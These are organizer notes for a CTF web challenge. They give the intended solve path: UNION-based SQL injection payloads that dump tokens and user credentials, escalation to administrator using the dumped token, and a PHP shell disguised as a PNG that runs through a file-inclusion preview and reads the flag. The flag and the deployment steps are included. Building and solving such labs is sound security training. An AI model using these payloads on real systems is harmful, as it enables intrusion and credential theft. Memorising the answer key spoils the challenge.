# NexusLab CTF Challenge — Organizer Notes

## Flag
```
softwarica_ctf{+#1$_1$_+#3_f|@8_y0u_w3R3_|00k1n9_f0r}
```
Stored at: `/var/secrets/.flag_db9f2a` (outside web root, non-hardcoded read at runtime)

---

## Intended Solve Path

### Step 1 — Login (Entry Point)
Use guest credentials: `guest` / `guest123`
(Or any valid account — the SQLi is on the product search page, not login)

---

### Step 2 — UNION-Based SQLi on /products.php

The search field is vulnerable:
```sql
SELECT id, name, category, price, description FROM products WHERE visible=1 AND (name LIKE '%INPUT%' OR category LIKE '%INPUT%')
```

**5 columns**, all visible. Chain:

**Step 2a — Confirm column count & types:**
```
%' UNION SELECT 1,2,3,4,5-- -
```

**Step 2b — Enumerate tables:**
```
%' UNION SELECT 1,group_concat(name),3,4,5 FROM sqlite_master WHERE type='table'-- -
```
Returns: `users, products, system_tokens`

**Step 2c — Dump system_tokens:**
```
%' UNION SELECT 1,token_name,token_value,privilege_level,5 FROM system_tokens-- -
```
Returns:
- `operator_bootstrap` → `NX-7f4a2d91-OPERATOR` (level 2)
- `admin_escalation_key` → `NX-PRIV-c3b1e8a7f2d940` (level 3)

**Step 2d (bonus) — Dump users table for creds:**
```
%' UNION SELECT 1,username,password,role,email FROM users-- -
```

---

### Step 3 — Privilege Escalation on /admin.php

Navigate to `/admin.php`. You'll see the escalation token form.

Submit: `NX-PRIV-c3b1e8a7f2d940`

Session role is elevated to `administrator`.

---

### Step 4 — LFI via .png Extension on /upload.php

Apache is configured to execute `.png` files as PHP (`SetHandler application/x-httpd-php`).

**Step 4a — Create a PHP webshell disguised as a PNG:**

File contents (save as `exploit.png`):
```php
<?php echo file_get_contents('/var/secrets/.flag_db9f2a'); ?>
```

**Step 4b — Upload it** via the upload form (accepts `.png` only ✓)

**Step 4c — Trigger LFI via preview parameter:**
```
/upload.php?preview=exploit.png
```

The server includes the file via `include($preview_path)`, which executes the PHP, reads the flag from `/var/secrets/.flag_db9f2a`, and outputs it in the preview box.

**Flag is revealed:**
```
softwarica_ctf{+#1$_1$_+#3_f|@8_y0u_w3R3_|00k1n9_f0r}
```

---

## Vulnerability Summary

| Vuln | Location | Method |
|------|----------|--------|
| UNION SQLi | `/products.php?search=` | 5-column UNION, SQLite `sqlite_master` |
| Privilege Escalation | `/admin.php` | Token from SQLi → session role elevation |
| LFI + PHP in .png | `/upload.php?preview=` | Apache executes .png as PHP, `include()` |

---

## Deployment on Render

1. Push repo to GitHub
2. New Web Service → Connect repo
3. Runtime: **Docker**
4. Render auto-reads `render.yaml`
5. Deploy — DB initializes on first boot via `entrypoint.sh`

No environment variables needed. SQLite DB is ephemeral (resets on redeploy) — intended behavior for CTF.
